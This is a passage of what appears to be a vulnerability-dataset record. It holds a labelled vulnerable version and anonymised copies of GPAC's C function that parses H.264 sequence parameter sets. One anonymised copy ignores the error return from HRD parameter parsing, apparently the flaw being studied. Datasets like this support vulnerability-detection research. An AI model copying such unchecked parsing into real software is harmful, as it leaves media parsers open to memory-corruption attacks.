VAR_5->vui.matrix_coefficients = gf_bs_read_int_log(VAR_0, 8, ""matrix_coefficients"");
}
}
if (gf_bs_read_int_log(VAR_0, 1, ""chroma_location_info_present_flag"")) {
gf_bs_read_ue_log(VAR_0, ""chroma_sample_location_type_top_field"");
gf_bs_read_ue_log(VAR_0, ""chroma_sample_location_type_bottom_field"");
}
VAR_5->vui.timing_info_present_flag = gf_bs_read_int_log(VAR_0, 1, ""timing_info_present_flag"");
if (VAR_5->vui.timing_info_present_flag) {
VAR_5->vui.num_units_in_tick = gf_bs_read_int_log(VAR_0, 32, ""num_units_in_tick"");
VAR_5->vui.time_scale = gf_bs_read_int_log(VAR_0, 32, ""time_scale"");
VAR_5->vui.fixed_frame_rate_flag = gf_bs_read_int_log(VAR_0, 1, ""fixed_frame_rate_flag"");
}
VAR_5->vui.nal_hrd_parameters_present_flag = gf_bs_read_int_log(VAR_0, 1, ""nal_hrd_parameters_present_flag"");
if (VAR_5->vui.nal_hrd_parameters_present_flag)
avc_parse_hrd_parameters(VAR_0, &VAR_5->vui.hrd);
VAR_5->vui.vcl_hrd_parameters_present_flag = gf_bs_read_int_log(VAR_0, 1, ""vcl_hrd_parameters_present_flag"");
if (VAR_5->vui.vcl_hrd_parameters_present_flag)
avc_parse_hrd_parameters(VAR_0, &VAR_5->vui.hrd);
if (VAR_5->vui.nal_hrd_parameters_present_flag || VAR_5->vui.vcl_hrd_parameters_present_flag)
VAR_5->vui.low_delay_hrd_flag = gf_bs_read_int_log(VAR_0, 1, ""low_delay_hrd_flag"");
VAR_5->vui.pic_struct_present_flag = gf_bs_read_int_log(VAR_0, 1, ""pic_struct_present_flag"");
}
if (VAR_2) {
if ((VAR_9 == 83) || (VAR_9 == 86)) {
u8 VAR_40;
gf_bs_read_int_log(VAR_0, 1, ""inter_layer_deblocking_filter_control_present_flag"");
VAR_40 = gf_bs_read_int_log(VAR_0, 2, ""extended_spatial_scalability_idc"");
if (VAR_5->ChromaArrayType == 1 || VAR_5->ChromaArrayType == 2) {
gf_bs_read_int_log(VAR_0, 1, ""chroma_phase_x_plus1_flag"");
}
if (VAR_5->ChromaArrayType == 1) {
gf_bs_read_int_log(VAR_0, 2, ""chroma_phase_y_plus1"");
}
if (VAR_40 == 1) {
if (VAR_5->ChromaArrayType > 0) {
gf_bs_read_int_log(VAR_0, 1, ""seq_ref_layer_chroma_phase_x_plus1_flag"");
gf_bs_read_int_log(VAR_0, 2, ""seq_ref_layer_chroma_phase_y_plus1"");
}
gf_bs_read_se_log(VAR_0, ""seq_scaled_ref_layer_left_offset"");
gf_bs_read_se_log(VAR_0, ""seq_scaled_ref_layer_top_offset"");
gf_bs_read_se_log(VAR_0, ""seq_scaled_ref_layer_right_offset"");
gf_bs_read_se_log(VAR_0, ""seq_scaled_ref_layer_bottom_offset"");
}
if (gf_bs_read_int_log(VAR_0, 1, ""seq_tcoeff_level_prediction_flag"")) {
gf_bs_read_int_log(VAR_0, 1, ""adaptive_tcoeff_level_prediction_flag"");
}
gf_bs_read_int_log(VAR_0, 1, ""slice_header_restriction_flag"");
if (gf_bs_read_int_log(VAR_0, 1, ""svc_vui_parameters_present"")) {
u32 VAR_41 = gf_bs_read_ue_log(VAR_0, ""vui_ext_num_entries_minus1"");
for (VAR_12 = 0; VAR_12 <= VAR_41; VAR_12++) {
u8 VAR_42, VAR_43, VAR_44;
gf_bs_read_int_log(VAR_0, 3, ""vui_ext_dependency_id"");
gf_bs_read_int_log(VAR_0, 4, ""vui_ext_quality_id"");
gf_bs_read_int_log(VAR_0, 3, ""vui_ext_temporal_id"");
VAR_44 = gf_bs_read_int_log(VAR_0, 1, ""vui_ext_timing_info_present_flag"");
if (VAR_44) {
gf_bs_read_int_log(VAR_0, 32, ""vui_ext_num_units_in_tick"");
gf_bs_read_int_log(VAR_0, 32, ""vui_ext_time_scale"");
gf_bs_read_int_log(VAR_0, 1, ""vui_ext_fixed_frame_rate_flag"");
}
VAR_42 = gf_bs_read_int_log(VAR_0, 1, ""vui_ext_nal_hrd_parameters_present_flag"");
if (VAR_42) {
}
VAR_43 = gf_bs_read_int_log(VAR_0, 1, ""vui_ext_vcl_hrd_parameters_present_flag"");
if (VAR_43) {
}
if (VAR_42 || VAR_43) {
gf_bs_read_int_log(VAR_0, 1, ""vui_ext_low_delay_hrd_flag"");
}
gf_bs_read_int_log(VAR_0, 1, ""vui_ext_pic_struct_present_flag"");
}
}
}
else if ((VAR_9 == 118) || (VAR_9 == 128)) {
GF_LOG(VAR_45, VAR_32, (""[avc-h264] MVC parsing not implemented - skipping parsing end of Subset SPS\n""));
return VAR_8;
}
if (gf_bs_read_int_log(VAR_0, 1, ""additional_extension2"")) {
GF_LOG(VAR_39, VAR_32, (""[avc-h264] skipping parsing end of Subset SPS (additional_extension2)\n""));
return VAR_8;
}
}
return VAR_8;
}",gpac/e2acb1511d1e69115141ea3080afd1cce6a15497/av_parsers.c/vul/before/0.json,"static s32 gf_avc_read_sps_bs_internal(GF_BitStream *bs, AVCState *avc, u32 subseq_sps, u32 *vui_flag_pos, u32 nal_hdr)
{
	AVC_SPS *sps;
	s32 mb_width, mb_height, sps_id = -1;
	u32 profile_idc, level_idc, pcomp, i, chroma_format_idc, cl = 0, cr = 0, ct = 0, cb = 0, luma_bd, chroma_bd;
	u8 separate_colour_plane_flag = 0;

	if (!vui_flag_pos) {
		gf_bs_enable_emulation_byte_removal(bs, GF_TRUE);
	}

	if (!bs) {
		return -1;
	}

	if (!nal_hdr) {
		gf_bs_read_int_log(bs, 1, ""forbidden_zero_bit"");
		gf_bs_read_int_log(bs, 2, ""nal_ref_idc"");
		gf_bs_read_int_log(bs, 5, ""nal_unit_type"");
	}
	profile_idc = gf_bs_read_int_log(bs, 8, ""profile_idc"");

	pcomp = gf_bs_read_int_log(bs, 8, ""profile_compatibility"");
	/*sanity checks*/
	if (pcomp & 0x3)
		return -1;

	level_idc = gf_bs_read_int_log(bs, 8, ""level_idc"");

	/*SubsetSps is used to be sure that AVC SPS are not going to be scratched
	by subset SPS. According to the SVC standard, subset SPS can have the same sps_id
	than its base layer, but it does not refer to the same SPS. */
	sps_id = gf_bs_read_ue_log(bs, ""sps_id"") + GF_SVC_SSPS_ID_SHIFT * subseq_sps;
	if ((sps_id < 0) || (sps_id >= 32)) {
		return -1;
	}

	luma_bd = chroma_bd = 0;
	sps = &avc->sps[sps_id];
	chroma_format_idc = sps->ChromaArrayType = 1;
	sps->state |= subseq_sps ? AVC_SUBSPS_PARSED : AVC_SPS_PARSED;

	/*High Profile and SVC*/
	switch (profile_idc) {
	case 100:
	case 110:
	case 122:
	case 244:
	case 44:
		/*sanity checks: note1 from 7.4.2.1.1 of iso/iec 14496-10-N11084*/
		if (pcomp & 0xE0)
			return -1;
	case 83:
	case 86:
	case 118:
	case 128:
		chroma_format_idc = gf_bs_read_ue_log(bs, ""chroma_format_idc"");
		sps->ChromaArrayType = chroma_format_idc;
		if (chroma_format_idc == 3) {
			separate_colour_plane_flag = gf_bs_read_int_log(bs, 1, ""separate_colour_plane_flag"");
			/*
			Depending on the value of separate_colour_plane_flag, the value of the variable ChromaArrayType is assigned as follows.
			\96	If separate_colour_plane_flag is equal to 0, ChromaArrayType is set equal to chroma_format_idc.
			\96	Otherwise (separate_colour_plane_flag is equal to 1), ChromaArrayType is set equal to 0.
			*/
			if (separate_colour_plane_flag) sps->ChromaArrayType = 0;
		}
		luma_bd = gf_bs_read_ue_log(bs, ""luma_bit_depth"");
		chroma_bd = gf_bs_read_ue_log(bs, ""chroma_bit_depth"");
		/*qpprime_y_zero_transform_bypass_flag = */ gf_bs_read_int_log(bs, 1, ""qpprime_y_zero_transform_bypass_flag"");
		/*seq_scaling_matrix_present_flag*/
		if (gf_bs_read_int_log(bs, 1, ""seq_scaling_matrix_present_flag"")) {
			u32 k;
			for (k = 0; k < 8; k++) {
				if (gf_bs_read_int_log_idx(bs, 1, ""seq_scaling_list_present_flag"", k)) {
					u32 z, last = 8, next = 8;
					u32 sl = k < 6 ? 16 : 64;
					for (z = 0; z < sl; z++) {
						if (next) {
							s32 delta = gf_bs_read_se(bs);
							next = (last + delta + 256) % 256;
						}
						last = next ? next : last;
					}
				}
			}
		}
		break;
	}

	sps->profile_idc = profile_idc;
	sps->level_idc = level_idc;
	sps->prof_compat = pcomp;
	sps->log2_max_frame_num = gf_bs_read_ue_log(bs, ""log2_max_frame_num"") + 4;
	sps->poc_type = gf_bs_read_ue_log(bs, ""poc_type"");
	sps->chroma_format = chroma_format_idc;
	sps->luma_bit_depth_m8 = luma_bd;
	sps->chroma_bit_depth_m8 = chroma_bd;

	if (sps->poc_type == 0) {
		sps->log2_max_poc_lsb = gf_bs_read_ue_log(bs, ""log2_max_poc_lsb"") + 4;
	}
	else if (sps->poc_type == 1) {
		sps->delta_pic_order_always_zero_flag = gf_bs_read_int_log(bs, 1, ""delta_pic_order_always_zero_flag"");
		sps->offset_for_non_ref_pic = gf_bs_read_se_log(bs, ""offset_for_non_ref_pic"");
		sps->offset_for_top_to_bottom_field = gf_bs_read_se_log(bs, ""offset_for_top_to_bottom_field"");
		sps->poc_cycle_length = gf_bs_read_ue_log(bs, ""poc_cycle_length"");
		if (sps->poc_cycle_length > GF_ARRAY_LENGTH(sps->offset_for_ref_frame)) {
			sps->poc_cycle_length = 255;
			GF_LOG(GF_LOG_ERROR, GF_LOG_CODING, (""[avc-h264] offset_for_ref_frame overflow from poc_cycle_length\n""));
			return -1;
		}
		for (i = 0; i < sps->poc_cycle_length; i++)
			sps->offset_for_ref_frame[i] = gf_bs_read_se_log_idx(bs, ""offset_for_ref_frame"", i);
	}
	if (sps->poc_type > 2) {
		return -1;
	}
	sps->max_num_ref_frames = gf_bs_read_ue_log(bs, ""max_num_ref_frames"");
	sps->gaps_in_frame_num_value_allowed_flag = gf_bs_read_int_log(bs, 1, ""gaps_in_frame_num_value_allowed_flag"");
	mb_width = gf_bs_read_ue_log(bs, ""pic_width_in_mbs_minus1"") + 1;
	mb_height = gf_bs_read_ue_log(bs, ""pic_height_in_map_units_minus1"") + 1;

	sps->frame_mbs_only_flag = gf_bs_read_int_log(bs, 1, ""frame_mbs_only_flag"");

	sps->width = mb_width * 16;
	sps->height = (2 - sps->frame_mbs_only_flag) * mb_height * 16;

	if (!sps->frame_mbs_only_flag) sps->mb_adaptive_frame_field_flag = gf_bs_read_int_log(bs, 1, ""mb_adaptive_frame_field_flag"");
	gf_bs_read_int_log(bs, 1, ""direct_8x8_inference_flag"");

	if (gf_bs_read_int_log(bs, 1, ""frame_cropping_flag"")) {
		int CropUnitX, CropUnitY, SubWidthC = -1, SubHeightC = -1;

		if (chroma_format_idc == 1) {
			SubWidthC = 2; SubHeightC = 2;
		}
		else if (chroma_format_idc == 2) {
			SubWidthC = 2; SubHeightC = 1;
		}
		else if ((chroma_format_idc == 3) && (separate_colour_plane_flag == 0)) {
			SubWidthC = 1; SubHeightC = 1;
		}

		if (sps->ChromaArrayType == 0) {
			assert(SubWidthC == -1);
			CropUnitX = 1;
			CropUnitY = 2 - sps->frame_mbs_only_flag;
		}
		else {
			CropUnitX = SubWidthC;
			CropUnitY = SubHeightC * (2 - sps->frame_mbs_only_flag);
		}

		cl = gf_bs_read_ue_log(bs, ""frame_crop_left_offset"");
		cr = gf_bs_read_ue_log(bs, ""frame_crop_right_offset"");
		ct = gf_bs_read_ue_log(bs, ""frame_crop_top_offset"");
		cb = gf_bs_read_ue_log(bs, ""frame_crop_bottom_offset"");

		sps->width -= CropUnitX * (cl + cr);
		sps->height -= CropUnitY * (ct + cb);
		cl *= CropUnitX;
		cr *= CropUnitX;
		ct *= CropUnitY;
		cb *= CropUnitY;
	}
	sps->crop.left = cl;
	sps->crop.right = cr;
	sps->crop.top = ct;
	sps->crop.bottom = cb;

	if (vui_flag_pos) {
		*vui_flag_pos = (u32)gf_bs_get_bit_offset(bs);
	}
	/*vui_parameters_present_flag*/
	sps->vui_parameters_present_flag = gf_bs_read_int_log(bs, 1, ""vui_parameters_present_flag"");
	if (sps->vui_parameters_present_flag) {
		sps->vui.aspect_ratio_info_present_flag = gf_bs_read_int_log(bs, 1, ""aspect_ratio_info_present_flag"");
		if (sps->vui.aspect_ratio_info_present_flag) {
			s32 aspect_ratio_idc = gf_bs_read_int_log(bs, 8, ""aspect_ratio_idc"");
			if (aspect_ratio_idc == 255) {
				sps->vui.par_num = gf_bs_read_int_log(bs, 16, ""aspect_ratio_num"");
				sps->vui.par_den = gf_bs_read_int_log(bs, 16, ""aspect_ratio_den"");
			}
			else if (aspect_ratio_idc < GF_ARRAY_LENGTH(avc_hevc_sar) ) {
				sps->vui.par_num = avc_hevc_sar[aspect_ratio_idc].w;
				sps->vui.par_den = avc_hevc_sar[aspect_ratio_idc].h;
			}
			else {
				GF_LOG(GF_LOG_WARNING, GF_LOG_CODING, (""[avc-h264] Unknown aspect_ratio_idc: your video may have a wrong aspect ratio. Contact the GPAC team!\n""));
			}
		}
		sps->vui.overscan_info_present_flag = gf_bs_read_int_log(bs, 1, ""overscan_info_present_flag"");
		if (sps->vui.overscan_info_present_flag)
			gf_bs_read_int_log(bs, 1, ""overscan_appropriate_flag"");

		/* default values */
		sps->vui.video_format = 5;
		sps->vui.colour_primaries = 2;
		sps->vui.transfer_characteristics = 2;
		sps->vui.matrix_coefficients = 2;
		/* now read values if possible */
		sps->vui.video_signal_type_present_flag = gf_bs_read_int_log(bs, 1, ""video_signal_type_present_flag"");
		if (sps->vui.video_signal_type_present_flag) {
			sps->vui.video_format = gf_bs_read_int_log(bs, 3, ""video_format"");
			sps->vui.video_full_range_flag = gf_bs_read_int_log(bs, 1, ""video_full_range_flag"");
			sps->vui.colour_description_present_flag = gf_bs_read_int_log(bs, 1, ""colour_description_present_flag"");
			if (sps->vui.colour_description_present_flag) {
				sps->vui.colour_primaries = gf_bs_read_int_log(bs, 8, ""colour_primaries"");
				sps->vui.transfer_characteristics = gf_bs_read_int_log(bs, 8, ""transfer_characteristics"");
				sps->vui.matrix_coefficients = gf_bs_read_int_log(bs, 8, ""matrix_coefficients"");
			}
		}

		if (gf_bs_read_int_log(bs, 1, ""chroma_location_info_present_flag"")) {
			gf_bs_read_ue_log(bs, ""chroma_sample_location_type_top_field"");
			gf_bs_read_ue_log(bs, ""chroma_sample_location_type_bottom_field"");
		}

		sps->vui.timing_info_present_flag = gf_bs_read_int_log(bs, 1, ""timing_info_present_flag"");
		if (sps->vui.timing_info_present_flag) {
			sps->vui.num_units_in_tick = gf_bs_read_int_log(bs, 32, ""num_units_in_tick"");
			sps->vui.time_scale = gf_bs_read_int_log(bs, 32, ""time_scale"");
			sps->vui.fixed_frame_rate_flag = gf_bs_read_int_log(bs, 1, ""fixed_frame_rate_flag"");
		}

		sps->vui.nal_hrd_parameters_present_flag = gf_bs_read_int_log(bs, 1, ""nal_hrd_parameters_present_flag"");
		if (sps->vui.nal_hrd_parameters_present_flag)
			if (avc_parse_hrd_parameters(bs, &sps->vui.hrd)<0) return -1;

		sps->vui.vcl_hrd_parameters_present_flag = gf_bs_read_int_log(bs, 1, ""vcl_hrd_parameters_present_flag"");
		if (sps->vui.vcl_hrd_parameters_present_flag)
			if (avc_parse_hrd_parameters(bs, &sps->vui.hrd)<0) return -1;

		if (sps->vui.nal_hrd_parameters_present_flag || sps->vui.vcl_hrd_parameters_present_flag)
			sps->vui.low_delay_hrd_flag = gf_bs_read_int_log(bs, 1, ""low_delay_hrd_flag"");

		sps->vui.pic_struct_present_flag = gf_bs_read_int_log(bs, 1, ""pic_struct_present_flag"");
	}
	/*end of seq_parameter_set_data*/

	if (subseq_sps) {
		if ((profile_idc == 83) || (profile_idc == 86)) {
			u8 extended_spatial_scalability_idc;
			/*parsing seq_parameter_set_svc_extension*/

			gf_bs_read_int_log(bs, 1, ""inter_layer_deblocking_filter_control_present_flag"");
			extended_spatial_scalability_idc = gf_bs_read_int_log(bs, 2, ""extended_spatial_scalability_idc"");
			if (sps->ChromaArrayType == 1 || sps->ChromaArrayType == 2) {
				gf_bs_read_int_log(bs, 1, ""chroma_phase_x_plus1_flag"");
			}
			if (sps->ChromaArrayType == 1) {
				gf_bs_read_int_log(bs, 2, ""chroma_phase_y_plus1"");
			}
			if (extended_spatial_scalability_idc == 1) {
				if (sps->ChromaArrayType > 0) {
					gf_bs_read_int_log(bs, 1, ""seq_ref_layer_chroma_phase_x_plus1_flag"");
					gf_bs_read_int_log(bs, 2, ""seq_ref_layer_chroma_phase_y_plus1"");
				}
				gf_bs_read_se_log(bs, ""seq_scaled_ref_layer_left_offset"");
				gf_bs_read_se_log(bs, ""seq_scaled_ref_layer_top_offset"");
				gf_bs_read_se_log(bs, ""seq_scaled_ref_layer_right_offset"");
				gf_bs_read_se_log(bs, ""seq_scaled_ref_layer_bottom_offset"");
			}
			if (gf_bs_read_int_log(bs, 1, ""seq_tcoeff_level_prediction_flag"")) {
				gf_bs_read_int_log(bs, 1, ""adaptive_tcoeff_level_prediction_flag"");
			}
			gf_bs_read_int_log(bs, 1, ""slice_header_restriction_flag"");

			if (gf_bs_read_int_log(bs, 1, ""svc_vui_parameters_present"")) {
				u32 vui_ext_num_entries_minus1 = gf_bs_read_ue_log(bs, ""vui_ext_num_entries_minus1"");

				for (i = 0; i <= vui_ext_num_entries_minus1; i++) {
					u8 vui_ext_nal_hrd_parameters_present_flag, vui_ext_vcl_hrd_parameters_present_flag, vui_ext_timing_info_present_flag;
					gf_bs_read_int_log(bs, 3, ""vui_ext_dependency_id"");
					gf_bs_read_int_log(bs, 4, ""vui_ext_quality_id"");
					gf_bs_read_int_log(bs, 3, ""vui_ext_temporal_id"");
					vui_ext_timing_info_present_flag = gf_bs_read_int_log(bs, 1, ""vui_ext_timing_info_present_flag"");
					if (vui_ext_timing_info_present_flag) {
						gf_bs_read_int_log(bs, 32, ""vui_ext_num_units_in_tick"");
						gf_bs_read_int_log(bs, 32, ""vui_ext_time_scale"");
						gf_bs_read_int_log(bs, 1, ""vui_ext_fixed_frame_rate_flag"");
					}
					vui_ext_nal_hrd_parameters_present_flag = gf_bs_read_int_log(bs, 1, ""vui_ext_nal_hrd_parameters_present_flag"");
					if (vui_ext_nal_hrd_parameters_present_flag) {
						//hrd_parameters( )
					}
					vui_ext_vcl_hrd_parameters_present_flag = gf_bs_read_int_log(bs, 1, ""vui_ext_vcl_hrd_parameters_present_flag"");
					if (vui_ext_vcl_hrd_parameters_present_flag) {
						//hrd_parameters( )
					}
					if (vui_ext_nal_hrd_parameters_present_flag || vui_ext_vcl_hrd_parameters_present_flag) {
						gf_bs_read_int_log(bs, 1, ""vui_ext_low_delay_hrd_flag"");
					}
					gf_bs_read_int_log(bs, 1, ""vui_ext_pic_struct_present_flag"");
				}
			}
		}
		else if ((profile_idc == 118) || (profile_idc == 128)) {
			GF_LOG(GF_LOG_INFO, GF_LOG_CODING, (""[avc-h264] MVC parsing not implemented - skipping parsing end of Subset SPS\n""));
			return sps_id;
		}

		if (gf_bs_read_int_log(bs, 1, ""additional_extension2"")) {
			GF_LOG(GF_LOG_WARNING, GF_LOG_CODING, (""[avc-h264] skipping parsing end of Subset SPS (additional_extension2)\n""));
			return sps_id;
		}
	}
	return sps_id;
}","static s32 gf_avc_read_sps_bs_internal(GF_BitStream *VAR_0, AVCState *VAR_1, u32 VAR_2, u32 *VAR_3, u32 VAR_4)
{
	AVC_SPS *VAR_5;
	s32 VAR_6, VAR_7, VAR_8 = -1;
	u32 VAR_9, VAR_10, VAR_11, VAR_12, VAR_13, VAR_14 = 0, VAR_15 = 0, VAR_16 = 0, VAR_17 = 0, VAR_18, VAR_19;
	u8 VAR_20 = 0;

	if (!VAR_3) {
		gf_bs_enable_emulation_byte_removal(VAR_0, VAR_21);
	}

	if (!VAR_0) {
		return -1;
	}

	if (!VAR_4) {
		gf_bs_read_int_log(VAR_0, 1, ""forbidden_zero_bit"");
		gf_bs_read_int_log(VAR_0, 2, ""nal_ref_idc"");
		gf_bs_read_int_log(VAR_0, 5, ""nal_unit_type"");
	}
	VAR_9 = gf_bs_read_int_log(VAR_0, 8, ""profile_idc"");

	VAR_11 = gf_bs_read_int_log(VAR_0, 8, ""profile_compatibility"");
	/* COMMENT_0 */
	if (VAR_11 & 0x3)
		return -1;

	VAR_10 = gf_bs_read_int_log(VAR_0, 8, ""level_idc"");

	/* COMMENT_1 */
                                                                                  
                                                               
	VAR_8 = gf_bs_read_ue_log(VAR_0, ""sps_id"") + VAR_22 * VAR_2;
	if ((VAR_8 < 0) || (VAR_8 >= 32)) {
		return -1;
	}

	VAR_18 = VAR_19 = 0;
	VAR_5 = &VAR_1->sps[VAR_8];
	VAR_13 = VAR_5->ChromaArrayType = 1;
	VAR_5->state |= VAR_2 ? VAR_23 : VAR_24;

	/* COMMENT_4 */
	switch (VAR_9) {
	case 100:
	case 110:
	case 122:
	case 244:
	case 44:
		/* COMMENT_5 */
		if (VAR_11 & 0xE0)
			return -1;
	case 83:
	case 86:
	case 118:
	case 128:
		VAR_13 = gf_bs_read_ue_log(VAR_0, ""chroma_format_idc"");
		VAR_5->ChromaArrayType = VAR_13;
		if (VAR_13 == 3) {
			VAR_20 = gf_bs_read_int_log(VAR_0, 1, ""separate_colour_plane_flag"");
			/* COMMENT_6 */
                                                                                                                          
                                                                                                      
                                                                                               
     
			if (VAR_20) VAR_5->ChromaArrayType = 0;
		}
		VAR_18 = gf_bs_read_ue_log(VAR_0, ""luma_bit_depth"");
		VAR_19 = gf_bs_read_ue_log(VAR_0, ""chroma_bit_depth"");
		/* COMMENT_11 */ gf_bs_read_int_log(VAR_0, 1, ""qpprime_y_zero_transform_bypass_flag"");
		/* COMMENT_12 */
		if (gf_bs_read_int_log(VAR_0, 1, ""seq_scaling_matrix_present_flag"")) {
			u32 VAR_25;
			for (VAR_25 = 0; VAR_25 < 8; VAR_25++) {
				if (gf_bs_read_int_log_idx(VAR_0, 1, ""seq_scaling_list_present_flag"", VAR_25)) {
					u32 VAR_26, VAR_27 = 8, VAR_28 = 8;
					u32 VAR_29 = VAR_25 < 6 ? 16 : 64;
					for (VAR_26 = 0; VAR_26 < VAR_29; VAR_26++) {
						if (VAR_28) {
							s32 VAR_30 = gf_bs_read_se(VAR_0);
							VAR_28 = (VAR_27 + VAR_30 + 256) % 256;
						}
						VAR_27 = VAR_28 ? VAR_28 : VAR_27;
					}
				}
			}
		}
		break;
	}

	VAR_5->profile_idc = VAR_9;
	VAR_5->level_idc = VAR_10;
	VAR_5->prof_compat = VAR_11;
	VAR_5->log2_max_frame_num = gf_bs_read_ue_log(VAR_0, ""log2_max_frame_num"") + 4;
	VAR_5->poc_type = gf_bs_read_ue_log(VAR_0, ""poc_type"");
	VAR_5->chroma_format = VAR_13;
	VAR_5->luma_bit_depth_m8 = VAR_18;
	VAR_5->chroma_bit_depth_m8 = VAR_19;

	if (VAR_5->poc_type == 0) {
		VAR_5->log2_max_poc_lsb = gf_bs_read_ue_log(VAR_0, ""log2_max_poc_lsb"") + 4;
	}
	else if (VAR_5->poc_type == 1) {
		VAR_5->delta_pic_order_always_zero_flag = gf_bs_read_int_log(VAR_0, 1, ""delta_pic_order_always_zero_flag"");
		VAR_5->offset_for_non_ref_pic = gf_bs_read_se_log(VAR_0, ""offset_for_non_ref_pic"");
		VAR_5->offset_for_top_to_bottom_field = gf_bs_read_se_log(VAR_0, ""offset_for_top_to_bottom_field"");
		VAR_5->poc_cycle_length = gf_bs_read_ue_log(VAR_0, ""poc_cycle_length"");
		if (VAR_5->poc_cycle_length > GF_ARRAY_LENGTH(VAR_5->offset_for_ref_frame)) {
			VAR_5->poc_cycle_length = 255;
			GF_LOG(VAR_31, VAR_32, (""[avc-h264] offset_for_ref_frame overflow from poc_cycle_length\n""));
			return -1;
		}
		for (VAR_12 = 0; VAR_12 < VAR_5->poc_cycle_length; VAR_12++)
			VAR_5->offset_for_ref_frame[VAR_12] = gf_bs_read_se_log_idx(VAR_0, ""offset_for_ref_frame"", VAR_12);
	}
	if (VAR_5->poc_type > 2) {
		return -1;
	}
	VAR_5->max_num_ref_frames = gf_bs_read_ue_log(VAR_0, ""max_num_ref_frames"");
	VAR_5->gaps_in_frame_num_value_allowed_flag = gf_bs_read_int_log(VAR_0, 1, ""gaps_in_frame_num_value_allowed_flag"");
	VAR_6 = gf_bs_read_ue_log(VAR_0, ""pic_width_in_mbs_minus1"") + 1;
	VAR_7 = gf_bs_read_ue_log(VAR_0, ""pic_height_in_map_units_minus1"") + 1;

	VAR_5->frame_mbs_only_flag = gf_bs_read_int_log(VAR_0, 1, ""frame_mbs_only_flag"");

	VAR_5->width = VAR_6 * 16;
	VAR_5->height = (2 - VAR_5->frame_mbs_only_flag) * VAR_7 * 16;

	if (!VAR_5->frame_mbs_only_flag) VAR_5->mb_adaptive_frame_field_flag = gf_bs_read_int_log(VAR_0, 1, ""mb_adaptive_frame_field_flag"");
	gf_bs_read_int_log(VAR_0, 1, ""direct_8x8_inference_flag"");

	if (gf_bs_read_int_log(VAR_0, 1, ""frame_cropping_flag"")) {
		int VAR_33, VAR_34, VAR_35 = -1, VAR_36 = -1;

		if (VAR_13 == 1) {
			VAR_35 = 2; VAR_36 = 2;
		}
		else if (VAR_13 == 2) {
			VAR_35 = 2; VAR_36 = 1;
		}
		else if ((VAR_13 == 3) && (VAR_20 == 0)) {
			VAR_35 = 1; VAR_36 = 1;
		}

		if (VAR_5->ChromaArrayType == 0) {
			assert(VAR_35 == -1);
			VAR_33 = 1;
			VAR_34 = 2 - VAR_5->frame_mbs_only_flag;
		}
		else {
			VAR_33 = VAR_35;
			VAR_34 = VAR_36 * (2 - VAR_5->frame_mbs_only_flag);
		}

		VAR_14 = gf_bs_read_ue_log(VAR_0, ""frame_crop_left_offset"");
		VAR_15 = gf_bs_read_ue_log(VAR_0, ""frame_crop_right_offset"");
		VAR_16 = gf_bs_read_ue_log(VAR_0, ""frame_crop_top_offset"");
		VAR_17 = gf_bs_read_ue_log(VAR_0, ""frame_crop_bottom_offset"");

		VAR_5->width -= VAR_33 * (VAR_14 + VAR_15);
		VAR_5->height -= VAR_34 * (VAR_16 + VAR_17);
		VAR_14 *= VAR_33;
		VAR_15 *= VAR_33;
		VAR_16 *= VAR_34;
		VAR_17 *= VAR_34;
	}
	VAR_5->crop.left = VAR_14;
	VAR_5->crop.right = VAR_15;
	VAR_5->crop.top = VAR_16;
	VAR_5->crop.bottom = VAR_17;

	if (VAR_3) {
		*VAR_3 = (u32)gf_bs_get_bit_offset(VAR_0);
	}
	/* COMMENT_13 */
	VAR_5->vui_parameters_present_flag = gf_bs_read_int_log(VAR_0, 1, ""vui_parameters_present_flag"");
	if (VAR_5->vui_parameters_present_flag) {
		VAR_5->vui.aspect_ratio_info_present_flag = gf_bs_read_int_log(VAR_0, 1, ""aspect_ratio_info_present_flag"");
		if (VAR_5->vui.aspect_ratio_info_present_flag) {
			s32 VAR_37 = gf_bs_read_int_log(VAR_0, 8, ""aspect_ratio_idc"");
			if (VAR_37 == 255) {
				VAR_5->vui.par_num = gf_bs_read_int_log(VAR_0, 16, ""aspect_ratio_num"");
				VAR_5->vui.par_den = gf_bs_read_int_log(VAR_0, 16, ""aspect_ratio_den"");
			}
			else if (VAR_37 < GF_ARRAY_LENGTH(VAR_38) ) {
				VAR_5->vui.par_num = VAR_38[VAR_37].w;
				VAR_5->vui.par_den = VAR_38[VAR_37].h;
			}
			else {
				GF_LOG(VAR_39, VAR_32, (""[avc-h264] Unknown aspect_ratio_idc: your video may have a wrong aspect ratio. Contact the GPAC team!\n""));
			}
		}
		VAR_5->vui.overscan_info_present_flag = gf_bs_read_int_log(VAR_0, 1, ""overscan_info_present_flag"");
		if (VAR_5->vui.overscan_info_present_flag)
			gf_bs_read_int_log(VAR_0, 1, ""overscan_appropriate_flag"");

		/* COMMENT_14 */
		VAR_5->vui.video_format = 5;
		VAR_5->vui.colour_primaries = 2;
		VAR_5->vui.transfer_characteristics = 2;
		VAR_5->vui.matrix_coefficients = 2;
		/* COMMENT_15 */
		VAR_5->vui.video_signal_type_present_flag = gf_bs_read_int_log(VAR_0, 1, ""video_signal_type_present_flag"");
		if (VAR_5->vui.video_signal_type_present_flag) {
			VAR_5->vui.video_format = gf_bs_read_int_log(VAR_0, 3, ""video_format"");
			VAR_5->vui.video_full_range_flag = gf_bs_read_int_log(VAR_0, 1, ""video_full_range_flag"");
			VAR_5->vui.colour_description_present_flag = gf_bs_read_int_log(VAR_0, 1, ""colour_description_present_flag"");
			if (VAR_5->vui.colour_description_present_flag) {
				VAR_5->vui.colour_primaries = gf_bs_read_int_log(VAR_0, 8, ""colour_primaries"");
				VAR_5->vui.transfer_characteristics = gf_bs_read_int_log(VAR_0, 8, ""transfer_characteristics"");
				VAR_5->vui.matrix_coefficients = gf_bs_read_int_log(VAR_0, 8, ""matrix_coefficients"");
			}
		}

		if (gf_bs_read_int_log(VAR_0, 1, ""chroma_location_info_present_flag"")) {
			gf_bs_read_ue_log(VAR_0, ""chroma_sample_location_type_top_field"");
			gf_bs_read_ue_log(VAR_0, ""chroma_sample_location_type_bottom_field"");
		}

		VAR_5->vui.timing_info_present_flag = gf_bs_read_int_log(VAR_0, 1, ""timing_info_present_flag"");
		if (VAR_5->vui.timing_info_present_flag) {
			VAR_5->vui.num_units_in_tick = gf_bs_read_int_log(VAR_0, 32, ""num_units_in_tick"");
			VAR_5->vui.time_scale = gf_bs_read_int_log(VAR_0, 32, ""time_scale"");
			VAR_5->vui.fixed_frame_rate_flag = gf_bs_read_int_log(VAR_0, 1, ""fixed_frame_rate_flag"");
		}

		VAR_5->vui.nal_hrd_parameters_present_flag = gf_bs_read_int_log(VAR_0, 1, ""nal_hrd_parameters_present_flag"");
